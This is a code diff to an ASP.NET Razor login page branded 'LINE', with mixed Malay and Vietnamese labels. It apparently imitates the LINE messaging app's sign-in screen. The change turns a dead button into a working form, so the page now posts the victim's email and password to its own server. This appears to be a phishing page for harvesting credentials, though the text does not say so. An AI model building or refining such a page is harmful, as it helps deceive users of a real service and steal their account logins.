@@ -12,43 +12,39 @@
 </head>
 <body>
     <div>
-        <table align="center">
-            <tr>
-                <td>
-                    <h1 style="text-align: center; padding-top: 45px; font-family: Arial; color:limegreen">LINE</h1>
+        @using (Html.BeginForm())
+        {
+            <table align="center">
+                <tr>
+                    <td>
+                        <h1 style="text-align: center; padding-top: 45px; font-family: Arial; color:limegreen">LINE</h1>
 
-                    <table align="center" style="width:390px">
-                        <tr>
-                            <td style="width:380px">
-                                <input type="text"
-                                       placeholder="Alamat E-mel"
-                                       name="uname"
-                                       required
-                                       style="width: 378px; height: 35px; border: none !important" />
-                            </td>
-                        </tr>
-                        <tr>
-                            <td style="width:380px; padding-top:10px; padding-bottom:20px">
-                                <input type="password" placeholder="Mật khẩu" name="psw" required style="width: 378px; height: 35px; border: none !important" />
-                            </td>
-                        </tr>
-                        <tr>
-                            <td>
-                                <button type="button" class="btn-primary" onclick="location.href='LoginLine'" style="width: 400px; height: 55px !important; background-color: limegreen !important; border: none !important">
-                                    <table align="left" width="390px">
-                                        <tr>
-                                            <td align="center">
-                                                <h4 style="text-align: center; font-family:Arial; color:white">Đăng nhập</h4>
-                                            </td>
-                                        </tr>
-                                    </table>
-                                </button>
-                            </td>
-                        </tr>
-                    </table>
-                </td>
-            </tr>
-        </table>
+                        <table align="center" style="width:390px">
+                            <tr>
+                                <td style="width:380px">
+                                    <input type="text"
+                                           placeholder="Alamat E-mel"
+                                           name="mail"
+                                           required
+                                           style="width: 378px; height: 35px; border: none !important" />
+                                </td>
+                            </tr>
+                            <tr>
+                                <td style="width:380px; padding-top:10px; padding-bottom:20px">
+                                    <input type="password" placeholder="Mật khẩu" name="psw" required style="width: 378px; height: 35px; border: none !important" />
+                                </td>
+                            </tr>
+                            <tr>
+                                <td>
+                                    <input type="submit" value="Đăng nhập" style="width: 380px; height: 55px !important; background-color: limegreen !important;
+                                                                                  border: none !important; font-weight: bold; color:white" />
+                                </td>
+                            </tr>
+                        </table>
+                    </td>
+                </tr>
+            </table>
+         }
     </div>
 </body>
 </html>
